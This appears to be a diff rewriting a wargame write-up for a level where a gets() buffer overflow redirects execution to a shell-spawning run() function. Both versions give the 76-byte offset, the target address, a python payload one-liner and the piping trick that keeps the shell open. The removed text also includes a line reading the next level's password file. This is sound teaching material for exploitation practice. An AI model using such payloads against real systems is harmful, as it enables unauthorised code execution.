@@ -1,58 +1,27 @@
-# Level 1 — Ret2func Stack Buffer Overflow
+# level1
 
-## Introduction
-This level introduces stack-based buffer overflows. We are given a binary that reads user input via the unsafe `gets()` function. While the `main` function does not call it, there is a helper function `run` in the binary that spawns a shell. We must redirect execution flow to this `run` function.
+We first decompile the code into C.
 
-## Analysis
-The reconstructed C code of the binary is as follows:
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
+We can see that we can trigger a segmentation fault with 76 characters of input. We also see that the program has a function named `run` that executes a shell, but it is not accessible from `main` (unlike the level before).
 
-void run(void) {
-    fwrite("Good... Wait what?\n", 1, 19, stdout);
-    system("/bin/sh");
-}
+So we will need to use a stack-based buffer overflow to call that function.
 
-int main(void) {
-    char local_50[76];
-    gets(local_50);
-    return 0;
-}
+To do so, first we need to know the address of that function. The offset in this case is easy—76 bytes—and that is all.
+
+First, we get the address of the `run` function by running the program through GDB and extracting the value with `info functions`:
+```text
+0x08048444
 ```
 
-Since the program uses `gets()`, which does not perform bounds checking on the input, we can write past the end of the `local_50` buffer (which holds 76 bytes) and overwrite the saved return address (EIP) of `main`.
-
-### Finding the Target Address
-We disassemble the binary using `gdb` to find the address of the `run` function:
-```gdb
-(gdb) info functions run
-All functions matching regular expression "run":
-
-Non-debugging symbols:
-0x08048444  run
-```
-
-The address of the `run` function is `0x08048444`.
-
-### Finding the Offset
-The buffer `local_50` starts exactly 76 bytes before the saved return address on the stack. Thus, writing 76 bytes of padding followed by the address of `run` will overwrite EIP with the address of `run`.
-
-When `main` executes the `return` statement, it pops the overwritten value into the instruction pointer (EIP), transferring control to the `run` function.
-
-## Exploit
-We generate the payload (reversing the address to little-endian representation `\x44\x84\x04\x08`):
+So we can write a python command to create our custom payload using the `[::-1]` slice to reverse the endianness of the address:
 ```bash
-python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
+python -c 'print "a" * 76 + "\x08\x04\x84\x44"[::-1]' > payload
 ```
 
-To run the exploit and keep the stdin stream open (so we can interact with the shell), we use the `cat` trick:
+And then we execute the payload with pipes to exploit the binary:
 ```bash
-(cat /tmp/payload; cat) | ./level1
+(cat payload; cat) | ./level1
 ```
 
-Once the shell is spawned, we can retrieve the password for `level2`:
-```bash
-cat /home/user/level2/.pass
-```
+### Why we can replace the address
+To understand why this works, we need to understand the concept of the return instruction (`ret`). When a return is called, the stack is used to change the execution pointer. In this case, the offset of the input buffer matches the offset to the saved return address (EIP). While this is not always the case, we need to verify how the base pointer (EBP) is set up and calculate the offset accordingly.
